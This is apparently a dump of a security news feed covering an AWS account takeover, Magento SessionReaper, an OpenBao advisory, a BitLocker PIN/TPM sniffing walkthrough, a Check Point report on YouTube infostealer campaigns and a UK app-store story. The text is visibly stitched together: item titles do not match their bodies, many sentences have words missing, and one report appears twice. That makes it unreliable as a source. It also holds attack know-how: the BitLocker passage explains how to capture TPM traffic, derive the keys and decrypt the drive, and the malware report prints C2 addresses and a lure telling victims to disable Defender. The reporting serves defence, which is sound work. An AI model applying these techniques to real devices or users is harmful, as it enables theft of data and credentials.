Ubuntu Server 24, plain setup. My guess? Crypto-mining.The attacker continues using his EC2 for a few hours.Oct 15th, Middle of the night - Establishing PersistenceBy now, he’s been in my account for over 48 hours. He decides to establish persistence:Creates four additional IAM users.One of them is literally .He launches his , flooding my inbox with useless emails. The goal: increase the chance that I’d miss AWS’s important notifications.He was betting that my email had already been validated by AWS and that I wouldn’t notice the verification email - which would allow him to create an Organization without me seeing it.I, unfortunately, saw the email… and approved it. 😅Five minutes later, he attempts the next move: creating the Organization. At this point, he might have thought his plan worked - that my email had been pre-validated and I hadn’t seen the notice. But I did see it, and my suspicion started rising.Adds a  within it.Then closes that account .I’m not entirely sure what his end goal was here. My guess: he tried something he hadn’t done before, attempting to take ownership of the Organization, but it didn’t succeed.This back-and-forth - Spam Army, Organization creation, and quick account closure - continued through the night and early morning of Oct 15th.Oct 15th, Morning - Frustration.By morning, the attacker was clearly getting . He’d poured a lot of effort into the Spam Army, but it wasn’t working the way he wanted.His focus starts slipping. He tries whatever he can think of next, still assuming his army of emails is active. In reality, the flood is .Switching tactics, he begins indexing all my resources using Resource Explorer, looking for anything useful.That’s when he notices something interesting: I have two domains managed in Route53 with .SES (Simple Email Service) is AWS managed service designed to allow mass, automated email sending, when conencted to a custom domain using DKIM records, it allows sending emails from any origin from within the domain.His thought process was clear:“If I can send emails from these domains, I might be able to phish the admin and take over.”Here’s why SES + Route53 + DKIM is important: If DKIM records are properly set between SES and Route53, anyone with SES access can send emails from any address in the domain. The attacker planned to leverage this to send phishing emails from my own domains.What he didn’t know: AWS had already notified me about the DKIM changes.He spent 30 minutes planning the phishing attempt, but by that point, I had already removed all his access to my account.And just like that, his plan was stopped dead in its tracks.Who is the attacker? What was their purpose?Here’s what I  know from the logs and what I tried to verify.I never gained access to the attacker’s running EC2 - I had already terminated it before thinking to snapshot it, so there’s no instance image to inspect. The AMI and snapshot he used looked like stock, out-of-the-box Ubuntu 24.04 - nothing exotic or fingerprintable there. Only one custom empty file in the snapshot. That makes attribution harder.The very first recorded action from the attacker came from this IP: .What I did next: I ran a passive lookup on the IP (geolocation/ASN/reverse DNS) and contacted the apparent provider -  - with an abuse report. So far, no reply.What this likely means (educated guesses, not certainties):The attacker was opportunistic and financially motivated. The EC2 profile (large instance, keypair/SSH access) strongly suggests crypto-mining or running resource-heavy workloads to convert compute into profit.The SES/DKIM activity and the attempt to send phishing from my own domains indicate a secondary or parallel goal: use my domain reputation to scale phishing attacks (and possibly harvest credentials).The attacker probed broadly (resource indexing, spam flood) - a classic pattern for someone scanning for exposed secrets and then weaponizing any access they find.Limits of what I can prove publicly:Without the EC2 instance snapshot or additional ISP cooperation, I can’t confidently attribute the attack to a particular actor or group.Stock AMIs and transient infrastructure are deliberately chosen by attackers to avoid easy fingerprinting.I reported everything to the provider and filed an abuse complaint. If they respond, I’ll share updates. For now, attribution remains inconclusive - but the behavior and artifacts point to financially motivated abuse (mining + phishing), rather than a targeted espionage campaign.AWS helped a lot cleansing my account, but wasn’t helpful either when it comes to identifying the attacker.Have any idea how to investigate further? contact me!How to avoid the leak in the first placeDon’t say “it won’t happen to me” - it can, and it will.Manage secrets in Secret Manager or HSM instead of hardcoding keys.Understand your frameworks and tech - know what your SSR or serverless code actually exposes.How to minimize the risk in case of a leakAdd basic security measures like  - cheap insurance. for day-to-day operations. so a leaked key is short-lived. - never give one key unlimited power.What to do in case of an incident - if it feels wrong, it probably is.Respond first, research later - containment comes before analysis.Don’t blindly trust ChatGPT for incident validation. - they have tools and processes for real-time containment.Don’t leave any stone unturned - check every IAM user, key, instance, and log.Looking back, this incident was humbling - and, honestly, a little embarrassing. I’m a cloud architect and a former vulnerability hunter, yet a single overlooked key in my personal account gave someone enough access to poke around, spin up EC2 instances, and almost misuse my domains. It’s easy to think,  but attackers don’t discriminate, and even small personal projects can be exploited.What saved me was speed, vigilance, and knowing where to look, but the experience reinforced a simple truth: security is not a checkbox, it’s a mindset.Even after regaining control, the lessons stayed clear. Secrets must be managed properly, privileges limited, alerts monitored, and unusual activity treated as critical. Respond fast, rotate keys, understand your frameworks, and never underestimate logs and notifications. At the end of the day, I got lucky - nothing critical was lost - but the takeaway is clear: assume every account can be targeted, and design your security accordingly. Even experts make mistakes; owning them, fixing them, and sharing your story is how we all get safer.]]></content:encoded></item><item><title>CVE-2025-54964 - BAE SOCET GXP Remote Command Execution Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-54964</link><author></author><category>vulns</category><pubDate>Thu, 23 Oct 2025 20:15:39 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-54964

It sounds like something straight out of a horror movie: . Behind the cinematic name hides a very real and very dangerous remote code execution flaw, tracked as CVE-2025-54236. It allows attackers to hijack live customer sessions—and, in some setups, even take full control of the server that runs the store.SessionReaper lives in a part of Magento that handles communication between the store and other services. The bug stems from improper input validation and unsafe handling of serialized data. In plain terms, Magento sometimes trusts data that no web application ever should. This lets an attacker trick the system into accepting a specially crafted “session” file as a legitimate user login—no password required.What they can do with that login depends on how the store is configured, but researchers at SecPod warn:“Successful exploitation of SessionReaper can lead to several severe consequences, including security feature bypass, customer account takeover, data theft, fraudulent orders, and potentially remote code execution.”Session-stealers like this one mean a compromised store can quietly expose a shopper’s personal details, order information, or payment data to attackers. In some cases, criminals inject “skimmer” code that harvests card details as you type them in or reroutes you to phishing sites designed to look like legitimate checkouts.A patch for the vulnerability was released on September 9, but six weeks later, roughly 62% of Magento stores reportedly remain unpatched. After someone published a proof-of-concept (PoC), cybercriminals quickly built working exploits and attacks are now spreading fast. So, while SessionReaper isn’t malware a shopper can “catch” directly, it can turn even trusted stores into possible data-theft traps until the site owners patch.Researchers at Sansec, whose sensors monitor e-commerce attacks worldwide, report seeing more than 250 Magento stores compromised within 24 hours of the exploit code going public.How consumers can stay safeWeb store owners should patch their Magento sites immediately. Unfortunately, regular shoppers have almost no way to tell whether a store is still vulnerable or already secured.From a consumer’s point of view, SessionReaper is another reminder that even trusted stores can quietly become unsafe between page loads. When a platform as widespread as Magento is under active attack, the best defense often lies outside the store itself.Watch out for odd behavior on a site or missing valid HTTPS, and don’t enter payment or personal data if something seems suspicious.Where possible, opt for checkout options that use third-party gateways (like PayPal), as they’re isolated from the store’s servers.Report suspicious e-commerce behavior to the site operator or your payment provider straight away.Shop on reputable sites whenever you can, or check the reviews and reputation of any new sellers before buying.Make sure your operating system, browser, and anti-malware software are up to date to protect against the latest threats.We don’t just report on threats—we remove them]]></content:encoded></item><item><title>CISA warns of Lanscope Endpoint Manager flaw exploited in attacks</title><link>https://www.bleepingcomputer.com/news/security/cisa-warns-of-lanscope-endpoint-manager-flaw-exploited-in-attacks/</link><author>Bill Toulas</author><category>security</category><pubDate>Thu, 23 Oct 2025 16:24:06 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[The Cybersecurity & Infrastructure Security Agency (CISA) is warning that hackers are exploiting a critical vulnerability in the Motex Landscope Endpoint Manager.

OpenBao's AWS Plugin generates AWS access credentials based on IAM policies. Prior to version 0.1.1, the AWS Plugin is vulnerable to cross-account IAM role Impersonation in the AWS auth method. The vulnerability allows an IAM role from an untrusted AWS account to authenticate by impersonating a role with the same name in a trusted account, leading to unauthorized access. This impacts all users of the auth-aws plugin who operate in a multi-account AWS environment where IAM role names may not be unique across accounts. This vulnerability has been patched in version 0.1.1 of the auth-aws plugin. A workaround for this issue involves guaranteeing that IAM role names are unique across all AWS accounts that could potentially interact with your OpenBao environment, and to audit for any duplicate IAM roles.

The attacker is now an insider that wants to get SYSTEM access. So we’re going to unlock the laptop’s drive and discuss a few peculiarities found along the way. There is nothing new presented here, except what to do when the tools fail.How does a PIN- protected BitLocker differ from the commonly encountered TPM-only (aka auto-deciphering) BitLocker?The FVEK, which is the actual disk encryption key is still on the disk next to the encrypted data and it is still encrypted with the VMK.The VMK is now stored on the disk instead of on the TPM. Of course it cannot be stored in plaintext so it’s encrypted using an Intermediate Key (IK). The IK key is stored encrypted in the TPM using the Stretched Key (SK). And finally the SK is derived from the user’s PIN.to authenticate to the TPM and unseal the encrypted IKto derive a key that will decrypt the TPM’s response and get the plaintext IKThis ensures that it’s impossible to brute force the PIN both online (since the TPM has a locking mechanism) and offline (since the disk key is not encrypted with the possibly weak PIN but with an intermediate random key).After removing the back cover and not immediately identifying a discrete TPM chip, I was confused and left wondering: “Is there really no more discrete TPM on these high-end laptops? Have they finally moved away from FIPS 140-2 and used a more secure fTPM?”.
Well, the answer is a resounding “No”: pulling out the whole motherboard confirms that they still use that Nuvoton NPCT760HABYX chip:
This TPM communicates over SPI, probably the most common protocol for laptop TPMs. SPI is a shared bus, therefore there’s a good chance that one or more memory chips are on the same bus but on the other, visible, side of the PCB. This is trivially verified using a multimeter in continuity mode.On the HP ProBook 4, the best candidate is right next to the RAM, an MX25U chip with very convenient test through holes into which I placed pins:
Blue is the clock, green and yellow are MOSI and MISO. Red is CS but it doesn’t actually matter. On older versions of DSView this caused the SPI parsers to fail, but they now ignore a missing CS.We’re now set up for a capture.The first problem I noticed was a strange clock that was driven high during dead times:
The oscilloscope confirmed the issue: the clock line was sitting idle at an intermediate voltage:
The solution is simple: use a 4.7kΩ pulldown resistor on the clock bus to force the line low when it’s not driven.The TIS protocol is used to send one byte per packet. So how come there are 2 bytes here?
I suspect that this is the acknowledgment being slow to send or understand which causes the data byte to be reemitted. This causes the TPM parser to completely fail:
Also, the responses encapsulations don’t make sense ( should probably be something like ), maybe that’s another pulldown that needs to be installed? But in the end it doesn’t matter since the last byte of the packet is always right and it’s the only one used.We will once again have to decode manually but that’s no big deal because thanks to the PIN, we know exactly where to look for the TPM commands (recall from part 1 that the capture was several million bytes), since we’re starting the capture right before sending the PIN, when there is no more activity on the bus. It’s actually a simpler attack!It was pointed out to me by @en4rab that selecting the TPM1.2 instead of 2.0 decoder correctly decodes the packet (though I can confirm that the DUT is indeed a TPM2.0). But since there are a few bitflips due to noise in my captured sample, the decoder still fails overall as it expects a perfect capture. So we’ll still go the manual route!Use the “save decoded data as” option of DSView to save separate MOSI and MISO lines. Use a regex to remove all TIS communications, for master that’s  and for slave that’s . After that, separate lines at TPM message headers  (normal session) and  (authenticated session). Master to slave is denoted with a ‘>’ and slave to master with a ‘<’.> TPM_CC.ReadPublic: Read the TPM's public key

I’ve compared a bunch of captures with good and bad PINs: the PIN is actually never sent to the TPM! I’m 99% sure that it’s used in the calculation of the unseal HMAC because that’s the only value that changes. This doesn’t seem to be documented anywhere.Okay we’ve finally grabbed the  command’s response. But the response buffer doesn’t look like something we’re used to. On the left side is a non-PIN-protected BitLocker, on the right side is the captured PIN-protected one.
The IK that protects the VMK is encrypted within this blob, using the SK derived from the PIN.First, the SK needs to be derived from the PIN. The latter is UTF-16LE encoded, hashed twice, then 0x100000 rounds of SHA256 with the disk’s salt are applied to it:The derived SK is now used to decrypt the buffer received from the TPM that was captured earlier to get IK:Decrypting the VMK requires finding its datum on the disk; the simplest way is to use dislocker. Here’s an example of its output:dislocker -vvvv /dev/loop7p3
...
Total datum size: 0x0050 (80) bytes

Header safe: 0x50, 0, 0x5, 0x1
The same exact decryption process covered for IK applies to the VMK using the values read in the datum. With this you can now decrypt and mount the disk still using dislocker. Privilege escalation from there is left to the reader.There are a bunchof scripts that do all of this automatically. One of them directly reads the info from the volume, while the other one uses dislocker to extract the disk data as presented above. Anyway in the end it just works and is cleaner than my own code. And that’s it!]]></content:encoded></item><item><title>North Korean Hackers Lure Defense Engineers With Fake Jobs to Steal Drone Secrets</title><link>https://thehackernews.com/2025/10/north-korean-hackers-lure-defense.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiK0FPtpkvxFxGAd0hh2wsJHxGCIA0PCJbURwlsS5x93_6Ak68WSe2rbdXj4xRMu5DddZcKeqoTD-VDuHCY9eNqF2IcnjDwm8OAbQs7rgZsTTq-uY9UfNurt5YFv_MuL9ytL5PxwpPWUfTa3_4h8uSr4D5xnIiXlbzQhAYhVnQRnC8xcAp-v1lO2xfT_fjO/s1600/drone-hacking.jpg" length="" type=""/><pubDate>Thu, 23 Oct 2025 15:29:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Threat actors with ties to North Korea have been attributed to a new wave of attacks targeting European companies active in the defense industry as part of a long-running campaign known as Operation Dream Job.

Overall, the majority of malware distributed via the YouTube Ghost Network consists of information-stealing malware (infostealers), posing a significant risk to user credentials and sensitive data.In recent years, threat actors have continuously adapted their tactics to discover new and effective methods for malware distribution. While email remains one of the most prominent infection vectors, its effectiveness has diminished due to widespread deployment of security solutions and increased user awareness. Consequently, attackers have sought alternative avenues to reach their targets more efficiently. One notable shift has been the use of malicious Google Ads campaigns, which redirect unsuspecting users to phishing pages designed to deliver malware. Through this approach, attackers cast a wide phishing net, luring users with seemingly legitimate “advertised” content.More recently, Check Point Research has identified a further evolution in this threat landscape, the emergence of  across multiple platforms. A Ghost Network is defined as a collection of fake or “ghost” accounts operating as a service, manipulating platform engagement mechanisms to disguise malicious activities as benign and enable large-scale malware distribution. The first fully documented instance of such a network was the , which operates on GitHub. In this case, ghost accounts host malicious repositories that appear trustworthy, deceiving victims into downloading malicious software.In this publication, Check Point Research examines another Ghost Network, this time operating on , which leverages over 3,000 malicious videos with the primary objective of distributing malware. Accounts within these networks are often compromised, and legitimate content is frequently hijacked to host malicious material. These videos typically receive , such as likes and encouraging comments, fostering a false sense of trust among viewers. The most frequently targeted content categories are  and , which continue to attract a substantial number of potential victims, despite the fact that cracking software is illegal and cracked versions often carry hidden malware.Activity associated with this network appears to have initiated around , coinciding with a marked increase in malicious YouTube videos and likely indicating the . From 2021 through , the volume of such videos remained relatively stable. However, in , despite the year not yet being complete, the number of malicious videos has already tripled compared to previous years, highlighting a  and underscoring the  of this distribution method.The YouTube Ghost Network is a collection of malicious accounts operating on YouTube. These accounts take advantage of various platform features, such as videos, descriptions, posts (a lesser-known YouTube feature similar to Facebook post) and comments to promote malicious content and distribute malware, while creating a false sense of trust. The majority of the network consists of compromised YouTube accounts, which, once added, are assigned specific operational roles. This role-based structure enables stealthier distribution, as banned accounts can be rapidly replaced without disrupting the overall operation.The three primary roles are as follows:, upload “phishing” videos and provide descriptions containing links to download the purported software. To further enhance legitimacy, these accounts often respond to comments from “users” on the malicious videos. After uploading, they may update the description with fresh links., are responsible for publishing community messages and posts. These accounts share the external download links and passwords for accessing password-protected archives. They frequently update these posts with new links and passwords. In some cases,  may also directly share the external link and password. Possibly, this type of account uses AI to engage with comments under the videos., endorse malicious content by posting positive comments or liking videos and posts, thereby making it appear safe and trustworthy.In addition to the typical methods described above, we have observed several variations in the tactics employed by :Sharing the external link directly in the description.Sharing the link as a pinned comment.Not sharing any links either in the description or in the comments, instead sharing the password and link during the video “installation” process.The external links provided typically redirect users to file-sharing services such as MediaFire, Dropbox, or Google Drive, or to phishing pages hosted on platforms like Google Sites, Blogspot, or Telegraph (). These pages contain further links to download the malicious software. Frequently, shortened URLs are used to hide the true destination of the external link.The description of such videos follows a typical “structure”, with a download link and password shared. Step-by-step instructions are often provided, commonly advising users to “temporarily” disable Windows Defender. In most cases, the malware distributed is an infostealer, designed to exfiltrate user information and credentials to a malicious command and control (C2) server.Check Point Research has been monitoring the YouTube Ghost Network for approximately a year and has identified multiple malware families, primarily infostealers, with  and  being among the most prevalent. From 2024 until the disruption of Lumma between March and May 2025, Lumma was the most frequently distributed malware. Following this disruption, threat actors shifted to distributing Rhadamanthys as the preferred infostealer.Campaign I – RhadamanthysThe YouTube channel , with , has published several videos primarily focused on  and , accumulating approximately  in total. Our analysis indicates that this account has been compromised for over a year, as evidenced by the appearance of malicious videos that differ significantly from the channel’s previous content.One video, which has garnered around , advertises cryptocurrency software and instructs viewers to follow a link provided in the description. This link redirects users to a phishing page hosted on , created by the threat actor, which also shares the password for a password-protected archive containing the malicious payload.Although the shared archive is malicious, the software does not function as claimed, and the executable is not bundled with any legitimate application, the video has received 42 comments, the majority of which are overwhelmingly positive and encourage viewers to download and execute the program. These comments are likely posted by compromised or malicious accounts, further convincing victims to proceed with the installation.The victims are redirected to the phishing site hosted on Google, where they are provided with installation instructions. A common step in these instructions is “Turning off Windows Defender”, a step often instructed in the installation guide for potential victims. Eventually, the malware runs on an unprotected machine. Full Message:Turn off Windows Defender temporarily
Don't worry — the archive is clean. Defender may trigger a false alert due to the way Setup.exe works with installations.
During this campaign, the threat actor utilized two different platforms to host the same malicious file, providing redundancy and increasing stealth in case one instance was detected or reported. Another observed tactic is the upload of large files, which are often overlooked by automated scanning systems. Additionally, password-protected archives are used to evade inspection, as security solutions cannot decompress and analyze the contents without the password.The archive contains multiple files designed to masquerade as legitimate software. Based on compilation and modification timestamps, the campaign likely began on 8 September.The delivered payload is the latest version of Rhadamanthys infostealer (), which was observed communicating with the command-and-control (C2) endpoint hxxps://94.74.164[.]157:8888/gateway/6xomjoww.1hj7n.On , the threat actor replaced the original payload with a new version and updated the links on their  phishing page. This campaign continues to distribute fresh malware, leveraging YouTube as a primary distribution channel.Subsequently, the actor switched to new Rhadamanthys v0.9.2 control servers: openai-pidor-with-ai[.]com:6343 and , using the path . The actor’s low-effort updates enable continuous distribution of the Rhadamanthys infostealer, significantly increasing the campaign’s persistence and reach.Campaign II – HijackLoader & RhadamanthysThe YouTube account , with approximately , was compromised between December 3, 2024, and January 5, 2025. Since the compromise, the account has uploaded four videos to distribute malware.One of the most viewed videos, with  and , was used to lure unsuspecting viewers into downloading and executing a cracked version of Adobe Photoshop.Within the video’s description, a community message link and the password required to decompress the password-protected archive are provided. The community post also includes the download link and archive password. This post received approximately  and numerous positive comments praising the effectiveness of the software solution. The short link shared in the post redirects users to Dropbox, where the file can be downloaded: hxxps://www.dropbox[.]com/scl/fi/9cwpoorh4xmxxpyssxdwi/Adobe.Premiere.Pro.2025.rar?rlkey=d1p8taclagn2brrdrg0qlic47&st=23bxjuyi&dl=1The specific account and post are responsible for distributing the latest link, which delivers a password-protected archive. This account has previously published multiple posts promoting various software products, including Adobe Photoshop, Adobe Premiere Pro, Lightroom, Filmora, FL Studio, and CorelDRAW. Notably, these applications appeal to a targeted audience of YouTubers and other content creators, suggesting that the threat actor may be deliberately tailoring their campaign toward this demographic.The downloaded archive contains an  with both compilation and modification timestamps of , indicating the likely start date of the campaign. The same file was first observed on VirusTotal on that date, exhibiting a low detection rate.Notably, the archive also contains a file named Adobe.Photoshop.2024.v25.1.0.120.exe, which is in fact a cracked version of Adobe Photoshop. It remains unclear whether the positive comments originate from real users who inadvertently infected themselves or from ghost accounts promoting the malicious software with AI comments.The  installer within the archive contains multiple files. Analysis of the  table using lessmsi reveals that the executable  is launched first, before being written to disk as . The payload identified is , which subsequently delivers the . In this campaign, Rhadamanthys was observed communicating with the command-and-control (C2) server at hxxps://5.252.155[.]99/gateway/r2sh55wm.a56d3.On , the attacker updated the archive and added new download links. The updated Rhadamanthys malware communicates with hxxps://5.252[.]155.231/gateway/3jw9q65j.b3tit. The VirusTotal detection score for this sample was even lower than previous submissions, indicating a high likelihood that the attack could evade detection by most antivirus solutions.The attacker appears to release a new version of the malware every three to four days, rotating control servers (C2s) with each update. These short-lived builds and frequent C2 changes undermine reputation-based detection mechanisms. Each new sample and C2 endpoint appears new to security systems, preventing the accumulation of reputation data and making it more difficult to block the campaign.Targeting users through Ghost Networks is analogous to casting nets across the web, users must approach and essentially infect themselves. To attract these users, threat actors offer a variety of tailored solutions designed to appeal to specific audiences. By analyzing more than  video titles, we identified and categorized the user groups that were most frequently targeted and most actively engaged.The most targeted game from the “Game Hacks/ Cheats” is Roblox, with  active users and about  active users. In the “Software Cracks/Piracy” category,  products are the primary targets, with  and  leading the list. The most viewed malicious video in our dataset targets , amassing  and , while the second most viewed targets FL Studio, with . Although the game category contains a greater number of videos, the total view counts are significantly lower compared to those in the software category.The ongoing evolution of malware distribution methods demonstrates the remarkable adaptability and resourcefulness of threat actors in bypassing conventional security defenses. While email phishing remains a well-known and persistent threat, our research reveals that adversaries are increasingly shifting toward more sophisticated, platform-based strategies, most notably, the deployment of . These networks leverage the trust inherent in legitimate accounts and the engagement mechanisms of popular platforms to orchestrate large-scale, persistent, and highly effective malware campaigns.The YouTube Ghost Network, as uncovered in our investigation, exemplifies this new paradigm. By systematically compromising accounts and assigning them specialized roles, such as content creation, community engagement, and trust-building, threat actors are able to maintain operational continuity even in the face of account bans or takedowns. This modular, role-based structure not only increases the resilience of the network but also enables rapid adaptation to platform countermeasures, making detection and disruption significantly more challenging for defenders.Our analysis of over 3,000 malicious videos revealed a clear targeting strategy, content is tailored to appeal to high-engagement user groups, such as gamers seeking cheats and individuals searching for cracked or pirated software. The use of positive comments, likes, and community posts further amplifies the perceived legitimacy of these campaigns, increasing the likelihood of user interaction and self-infection. The sharp rise in malicious video uploads in 2025, tripling previous years’ volumes, underscores the scalability and growing effectiveness of this distribution model.The technical sophistication of these campaigns is further evidenced by the use of password-protected archives, redundant hosting platforms, and frequent updates to both payloads and command-and-control (C2) infrastructure. These tactics are specifically designed to evade automated detection, reputation-based blocking, and manual review by both platform operators and security vendors.The implications for the cybersecurity community are significant. As threat actors continue to innovate, collaboration between security researchers, platform providers, and law enforcement becomes increasingly critical. Proactive threat intelligence sharing, rapid takedown of malicious content, and continuous improvement of detection technologies are essential to counteract these evolving threats. Additionally, user education remains a vital line of defense, individuals must be made aware of the risks associated with downloading software from unofficial sources and the deceptive tactics employed by cybercriminals.Check Point Research’s comprehensive investigation into the YouTube Ghost Network has not only exposed the operational playbook of these actors but has also led to tangible disruption. By reporting over  malicious videos to Google, we have directly contributed to the dismantling of this network and the protection of countless users worldwide.

In recent years, threat actors have continuously adapted their tactics to discover new and effective methods for malware distribution. While email remains one of the most prominent infection vectors, its effectiveness has diminished due to widespread deployment of security solutions and increased user awareness. Consequently, attackers have sought alternative avenues to reach their targets more efficiently. One notable shift has been the use of **malicious Google Ads campaigns**, which redirect unsuspecting users to phishing pages designed to deliver malware. Through this approach, attackers cast a wide phishing net, luring users with seemingly legitimate “advertised” content.

More recently, Check Point Research has identified a further evolution in this threat landscape, the emergence of **Ghost Networks** across multiple platforms. A Ghost Network is defined as a collection of fake or “ghost” accounts operating as a service, manipulating platform engagement mechanisms to disguise malicious activities as benign and enable large-scale malware distribution. The first fully documented instance of such a network was the **Stargazers Ghost Network**, which operates on GitHub. In this case, ghost accounts host malicious repositories that appear trustworthy, deceiving victims into downloading malicious software.

In this publication, Check Point Research examines another Ghost Network, this time operating on **YouTube**, which leverages over 3,000 malicious videos with the primary objective of distributing malware. Accounts within these networks are often compromised, and legitimate content is frequently hijacked to host malicious material. These videos typically receive **positive engagement**, such as likes and encouraging comments, fostering a false sense of trust among viewers. The most frequently targeted content categories are **“Game Hacks/Cheats”** and **“Software Cracks/Piracy”**, which continue to attract a substantial number of potential victims, despite the fact that cracking software is illegal and cracked versions often carry hidden malware.

Activity associated with this network appears to have initiated around **2021**, coinciding with a marked increase in malicious YouTube videos and likely indicating the **network’s inception**. From 2021 through **2024**, the volume of such videos remained relatively stable. However, in **2025**, despite the year not yet being complete, the number of malicious videos has already **tripled compared to previous years**, highlighting a **significant upward trend** and underscoring the **growing effectiveness** of this distribution method.

The YouTube Ghost Network is a collection of malicious accounts operating on YouTube. These accounts take advantage of various platform features, such as videos, descriptions, posts (a lesser-known YouTube feature similar to Facebook post) and comments to promote malicious content and distribute malware, while creating a false sense of trust. The majority of the network consists of compromised YouTube accounts, which, once added, are assigned specific operational roles. This role-based structure enables stealthier distribution, as banned accounts can be rapidly replaced without disrupting the overall operation.

The three primary roles are as follows:

In addition to the typical methods described above, we have observed several variations in the tactics employed by **video-accounts**:

The external links provided typically redirect users to file-sharing services such as MediaFire, Dropbox, or Google Drive, or to phishing pages hosted on platforms like Google Sites, Blogspot, or Telegraph ( `telegra.ph`). These pages contain further links to download the malicious software. Frequently, shortened URLs are used to hide the true destination of the external link.

The description of such videos follows a typical “structure”, with a download link and password shared. Step-by-step instructions are often provided, commonly advising users to “temporarily” disable Windows Defender. In most cases, the malware distributed is an infostealer, designed to exfiltrate user information and credentials to a malicious command and control (C2) server.

Check Point Research has been monitoring the YouTube Ghost Network for approximately a year and has identified multiple malware families, primarily infostealers, with **Lumma** and **Rhadamanthys** being among the most prevalent. From 2024 until the disruption of Lumma between March and May 2025, Lumma was the most frequently distributed malware. Following this disruption, threat actors shifted to distributing Rhadamanthys as the preferred infostealer.

The YouTube channel `@Sound_Writer`, with **9,690 subscribers**, has published several videos primarily focused on **cryptocurrency software** and **gaming**, accumulating approximately **24,000 views** in total. Our analysis indicates that this account has been compromised for over a year, as evidenced by the appearance of malicious videos that differ significantly from the channel’s previous content.

One video, which has garnered around **10,000 views**, advertises cryptocurrency software and instructs viewers to follow a link provided in the description. This link redirects users to a phishing page hosted on `sites.google.com`, created by the threat actor, which also shares the password for a password-protected archive containing the malicious payload.

Although the shared archive is malicious, the software does not function as claimed, and the executable is not bundled with any legitimate application, the video has received 42 comments, the majority of which are overwhelmingly positive and encourage viewers to download and execute the program. These comments are likely posted by compromised or malicious accounts, further convincing victims to proceed with the installation.

The victims are redirected to the phishing site hosted on Google, where they are provided with installation instructions. A common step in these instructions is _“Turning off Windows Defender”,_ a step often instructed in the installation guide for potential victims. Eventually, the malware runs on an unprotected machine. Full Message:

Another observed tactic is the upload of large files, which are often overlooked by automated scanning systems. Additionally, password-protected archives are used to evade inspection, as security solutions cannot decompress and analyze the contents without the password.

The archive contains multiple files designed to masquerade as legitimate software. Based on compilation and modification timestamps, the campaign likely began on 8 September.

The delivered payload is the latest version of Rhadamanthys infostealer ( **v0.9.2**), which was observed communicating with the command-and-control (C2) endpoint `hxxps://94.74.164[.]157:8888/gateway/6xomjoww.1hj7n`.

On **23 September**, the threat actor replaced the original payload with a new version and updated the links on their `sites.google.com` phishing page. This campaign continues to distribute fresh malware, leveraging YouTube as a primary distribution channel.

Subsequently, the actor switched to new Rhadamanthys v0.9.2 control servers: `openai-pidor-with-ai[.]com:6343` and `178[.]16.53.236:6343`, using the path `/gateway/pqnrojhl.adc7k`. The actor’s low-effort updates enable continuous distribution of the Rhadamanthys infostealer, significantly increasing the campaign’s persistence and reach.

The YouTube account `@Afonesio1`, with approximately **129,000 subscribers**, was compromised between **December 3, 2024, and January 5, 2025**. Since the compromise, the account has uploaded four videos to distribute malware.

One of the most viewed videos, with **291,155 views** and **54 positive comments**, was used to lure unsuspecting viewers into downloading and executing a cracked version of Adobe Photoshop.

Within the video’s description, a community message link and the password required to decompress the password-protected archive are provided. The community post also includes the download link and archive password. This post received approximately **1,200 likes** and numerous positive comments praising the effectiveness of the software solution. The short link shared in the post redirects users to Dropbox, where the file can be downloaded: `hxxps://www.dropbox[.]com/scl/fi/9cwpoorh4xmxxpyssxdwi/Adobe.Premiere.Pro.2025.rar?rlkey=d1p8taclagn2brrdrg0qlic47&st=23bxjuyi&dl=1`

The specific account and post are responsible for distributing the latest link, which delivers a password-protected archive.

Notably, these applications appeal to a targeted audience of YouTubers and other content creators, suggesting that the threat actor may be deliberately tailoring their campaign toward this demographic.

The downloaded archive contains an **MSI file** with both compilation and modification timestamps of **21 September**, indicating the likely start date of the campaign. The same file was first observed on VirusTotal on that date, exhibiting a low detection rate.

Notably, the archive also contains a file named `Adobe.Photoshop.2024.v25.1.0.120.exe`, which is in fact a cracked version of Adobe Photoshop. It remains unclear whether the positive comments originate from real users who inadvertently infected themselves or from ghost accounts promoting the malicious software with AI comments.

The **MSI** installer within the archive contains multiple files. Analysis of the **CustomAction** table using lessmsi reveals that the executable `bw97v41m.exe` is launched first, before being written to disk as `Remote-Vector32.exe`. The payload identified is **HijackLoader**, which subsequently delivers the **Rhadamanthys infostealer**. In this campaign, Rhadamanthys was observed communicating with the command-and-control (C2) server at `hxxps://5.252.155[.]99/gateway/r2sh55wm.a56d3`.

On **24 September**, the attacker updated the archive and added new download links. The updated Rhadamanthys malware communicates with `hxxps://5.252[.]155.231/gateway/3jw9q65j.b3tit`. The VirusTotal detection score for this sample was even lower than previous submissions, indicating a high likelihood that the attack could evade detection by most antivirus solutions.

The most targeted game from the “Game Hacks/ Cheats” is Roblox, _with **380 million monthly** active users and about **111.8 million daily** active users._ In the “Software Cracks/Piracy” category, **Adobe** products are the primary targets, with **Photoshop** and **Lightroom** leading the list. The most viewed malicious video in our dataset targets **Adobe Photoshop**, amassing **293,000 views** and **54 comments**, while the second most viewed targets FL Studio, with **147,000 views**.

Between them, Apple and Google power nearly all UK mobile devices, according to the CMA:“Around 90–100% of UK mobile devices run on Apple or Google’s mobile platforms.”According to analyst data cited by the BBC, around 48.5% of British consumers use iPhones, with most of the rest on Android devices. Apple has pushed back, warning that EU-style regulation could limit access to new features. The company points to Apple Intelligence, which has been rolled out in other parts of the world but is not available in the EU—something Apple blames on heavy regulation.For app developers, the move could have profound effects. Smaller software makers, often frustrated by Apple’s 15–30% commission on in-app purchases, might gain alternative distribution routes. Competing app stores might offer lower fees or more flexible rules, making the app ecosystem more diverse, and potentially more affordable for users.Apple, however, argues that relaxing control could hurt users by weakening privacy standards and delaying feature updates.Allowing multiple app stores will undeniably reshape the iPhone’s security model. Apple’s current “closed system” approach minimizes risk by funneling all apps through its vetted App Store, where every submission goes through security reviews and malware screening. This walled approach has kept large-scale malware incidents on iPhones relatively rare compared to Android.It remains to be seen whether competing app stores will hold the same standards or have the resources to enforce them. Users can expect more variability in safety practices, which could increase exposure to fraudulent or malware-infested software.On the other hand, we may also see app stores that prioritize safety or cater to a more privacy-focused audience. So, it doesn’t have to be all bad—but Apple has a point when it warns about higher risk.For most users, the safest approach 